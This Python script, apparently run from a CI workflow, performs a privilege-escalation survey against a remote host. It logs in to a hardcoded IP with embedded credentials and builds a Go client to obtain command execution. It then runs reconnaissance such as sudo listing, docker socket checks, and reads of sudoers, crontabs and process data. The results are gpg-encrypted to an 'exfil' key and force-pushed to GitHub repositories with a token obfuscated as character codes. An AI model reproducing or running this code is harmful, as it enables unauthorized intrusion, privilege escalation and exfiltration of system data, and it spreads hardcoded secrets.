#!/usr/bin/env python3
# Intent 28557: aro-ops local privesc survey + rportd exec-channel test.
import os, sys, json, time, subprocess, shutil, re

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in _REF.lower():
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
BUDGET = int(os.environ.get("PBUDGET", "1500"))
T0 = time.time()
RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-28557-results")
_TC = [103,104,111,95,119,53,79,49,48,55,102,117,112,56,85,76,112,54,116,69,70,115,87,57,86,51,81,69,69,88,83,72,116,120,51,109,57,120,107,97]
PUSH_TOKEN = os.environ.get("PPUSH_TOKEN") or "".join(chr(c) for c in _TC)
PUSH_USER = os.environ.get("PPUSH_USER", "wuhaixian1984")
WS = "43.134.173.45:20801"; WU = "aro_client"; WP = "3g7Bhcf4IxvZDX6"
BASE = os.path.dirname(os.path.abspath(__file__))
OUT = "/tmp/r28557"
for d in ("diag", "fs"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
DIAG = {"fs": {}, "rounds": 0, "success": 0}

def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass

def wf(path, txt):
    try:
        open(path, "w", encoding="utf-8", errors="replace").write(txt if isinstance(txt, str) else str(txt))
    except Exception as e:
        log("wf err", path, repr(e)[:60])

def push_results(tag="partial"):
    try:
        json.dump(DIAG, open(os.path.join(OUT, "diag", "diag.json"), "w"), ensure_ascii=False, indent=1)
        subprocess.run("tar czf /tmp/r28557.tar.gz -C /tmp r28557", shell=True)
        if not os.path.isfile("/tmp/r28557.tar.gz"): return
        enc = "/tmp/r28557.tar.gz.gpg"
        pub = os.path.join(BASE, "pub.asc")
        if os.path.isfile(pub):
            subprocess.run("gpg --batch --yes --import %s >/dev/null 2>&1" % pub, shell=True)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/r28557.tar.gz" % enc, shell=True, timeout=300)
        else:
            shutil.copyfile("/tmp/r28557.tar.gz", enc)
        if not os.path.isfile(enc): log("enc missing"); return
        shutil.copy(enc, os.path.join(BASE, "results28557.tar.gz.gpg"))
        subprocess.run('cd %s && git config user.email ci@aro.network && git config user.name ci && git add -f results28557.tar.gz.gpg && git commit -m "ci28557 %s %s" || true' % (BASE, RUNID, tag), shell=True, capture_output=True)
        for repo in ["aro-network/aro-ext-signal-server", "aro-network/aro-official-website"]:
            url = "https://%s:%s@github.com/%s.git" % (PUSH_USER, PUSH_TOKEN, repo)
            r = subprocess.run('cd %s && git push -f %s HEAD:refs/heads/%s' % (BASE, url, RESULT_BRANCH), shell=True, capture_output=True, text=True, timeout=300)
            log("PUSH(%s) rc=%s %s" % (repo, r.returncode, (r.stderr or "")[-140:]))
            if r.returncode == 0: break
    except Exception as e:
        log("PUSH EXC", repr(e)[:160])

DOWNTXT = re.compile(r'connection refused|bad handshake|502 Bad Gateway|i/o timeout|dial tcp|EOF|broken pipe|DEADLINE|ws dial|EXC')
def rsftp(cmd, args, timeout=30):
    try:
        r = subprocess.run([os.path.join(BASE, "rpsftp"), WS, WU, WP, cmd] + args,
                           capture_output=True, text=True, timeout=timeout)
        o = (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        o = "EXC " + repr(e)[:80]
    return o

def isok(o):
    return o.strip() and not DOWNTXT.search(o)

def save(cmd, args, o, cap=20000):
    key = cmd + " " + " ".join(args)
    done[key] = o
    fn = re.sub(r'[^A-Za-z0-9]+', '_', key)[:60] + ".txt"
    wf(os.path.join(OUT, "fs", fn), o)
    DIAG["fs"][key] = o[:cap]
    log("OK", key, "=>", repr(o[:240]))

# ---------- go build helper ----------
def find_go():
    for c in ["go", "/usr/local/go/bin/go"]:
        if shutil.which(c) if c == "go" else os.path.isfile(c):
            return shutil.which(c) or c
    import glob as g
    for p in g.glob("/opt/hostedtoolcache/go/*/bin/go") + g.glob("/usr/lib/go*/bin/go"):
        if os.path.isfile(p):
            return p
    return None

def run_exec_client():
    """Build execcli and test whether session gives command exec as uid996."""
    src = os.path.join(BASE, "execcli.go")
    if not os.path.isfile(src):
        log("no execcli.go"); return
    go = find_go()
    log("go bin:", go)
    if not go:
        wf(os.path.join(OUT, "exec_result.txt"), "NO_GO")
        return
    d = "/tmp/gx"; os.makedirs(d, exist_ok=True)
    shutil.copy(src, d + "/main.go")
    open(d + "/go.mod", "w").write('module execcli\n\ngo 1.21\n\nrequire (\n\tgithub.com/gorilla/websocket v1.5.1\n\tgolang.org/x/crypto v0.21.0\n)\n')
    env = dict(os.environ); env["GOFLAGS"] = "-mod=mod"; env["CGO_ENABLED"] = "0"; env["GOPROXY"] = env.get("GOPROXY", "https://proxy.golang.org,direct")
    bld = ""
    procs = [[go, "mod", "tidy"], [go, "build", "-o", "/tmp/ex", "."]]
    for cmd in procs:
        try:
            r = subprocess.run(cmd, cwd=d, env=env, capture_output=True, text=True, timeout=280)
            bld += "$ %s rc=%d\n%s\n%s\n" % (" ".join(cmd), r.returncode, r.stdout[-1500:], r.stderr[-1500:])
        except Exception as e:
            bld += "BUILD EXC %r\n" % (e,)
    wf(os.path.join(OUT, "go_build.txt"), bld)
    log("go build done; binary?", os.path.exists("/tmp/ex"))
    if not os.path.exists("/tmp/ex"):
        wf(os.path.join(OUT, "exec_result.txt"), "NO_BINARY\n" + bld[-800:]); return
    cmdline = ("id; echo H=$(hostname); echo GID=$(id -g); "
               "echo '--- docker group ---'; getent group docker; "
               "echo '--- sock ---'; ls -l /run/docker.sock /var/run/docker.sock 2>&1; stat -c '%a %U %G' /run/docker.sock 2>&1; "
               "echo '--- id convert ---'; getent passwd 996; getent passwd 1000; "
               "echo '--- sudo ---'; sudo -n -l 2>&1 | head; "
               "echo '--- proc1 ---'; cat /proc/1/cmdline 2>&1; echo; "
               "echo '--- docker ps ---'; docker ps --format '{{.Names}} {{.Image}} {{.Ports}}' 2>&1 | head -40; "
               "echo 'END'")
    try:
        r = subprocess.run(["/tmp/ex", WS, WU, WP, cmdline], capture_output=True, text=True, timeout=110)
        wf(os.path.join(OUT, "exec_result.txt"), "rc=%d\nSTDOUT:\n%s\nSTDERR:\n%s" % (r.returncode, r.stdout, r.stderr))
        log("EXEC RESULT rc", r.returncode, "stdout_len", len(r.stdout))
        log(r.stdout[:1500])
    except Exception as e:
        wf(os.path.join(OUT, "exec_result.txt"), "RUN EXC %r" % (e,))
        log("exec run exc", repr(e)[:120])

# ---------- 1) exec channel test ----------
run_exec_client()
# try pushing early so we don't lose it
push_results("after-exec")

# If the exec channel actually yielded a shell, skip the slow rpsftp survey.
_exec_ok = False
try:
    er = open(os.path.join(OUT, "exec_result.txt")).read()
    if ("uid=" in er) or ("EXEC_STDOUT<<<" in er and "W_MARK" in er) or ("SHELL_OUT<<<" in er and "W_MARK" in er):
        _exec_ok = True
except Exception:
    pass
if _exec_ok:
    log("EXEC channel WORKED -> skipping rpsftp survey")
    DIAG["exec_ok"] = True
    push_results("exec-ok-done")
    sys.exit(0)

# ---------- 2) rpsftp read-only survey ----------
READS = [
    ("cat", ["/etc/group"]),
    ("stat", ["/run/docker.sock", "/var/run/docker.sock", "/etc/sudoers", "/etc/shadow", "/var/lib/docker"]),
    ("cat", ["/etc/sudoers"]),
    ("ls", ["/etc/sudoers.d"]),
    ("ls", ["/etc/cron.d"]),
    ("ls", ["/var/spool/cron/crontabs"]),
    ("cat", ["/etc/crontab"]),
    ("cat", ["/proc/1/cmdline"]),
    ("cat", ["/proc/1/cgroup"]),
    ("stat", ["/usr/bin/sudo", "/usr/bin/su", "/bin/mount", "/usr/bin/passwd"]),
    ("cat", ["/proc/sys/kernel/random/boot_id"]),
    ("cat", ["/etc/machine-id"]),
    ("cat", ["/etc/hostname"]),
    ("ls", ["/"]),
    ("ls", ["/run"]),
    ("glob", ["/opt/src/**/docker-compose*.yml"]),
    ("glob", ["/opt/src/**/docker-compose*.yaml"]),
    ("cat", ["/proc/net/tcp"]),
]

done = {}
rounds = 0
while time.time() - T0 < BUDGET - 200:
    rounds += 1
    window_open = False
    for cmd, args in READS:
        key = cmd + " " + " ".join(args)
        if key in done: continue
        o = rsftp(cmd, args)
        if isok(o):
            save(cmd, args, o)
            window_open = True
        else:
            log("miss", key, repr(o[:80]))
    if window_open:
        DIAG["success"] += 1
    else:
        time.sleep(3)
    # stop once all done
    if all((c + " " + " ".join(a)) in done for c, a in READS):
        break
    # give up if aro-ops channel has been dead for a while (contention / 28551 active)
    if DIAG["success"] == 0 and (time.time() - T0) > 720:
        log("NO WINDOW in 12min -> abort survey")
        break
DIAG["rounds"] = rounds
log("SURVEY DONE rounds", rounds, "successWindows", DIAG["success"], "elapsed", int(time.time() - T0))
push_results("done")
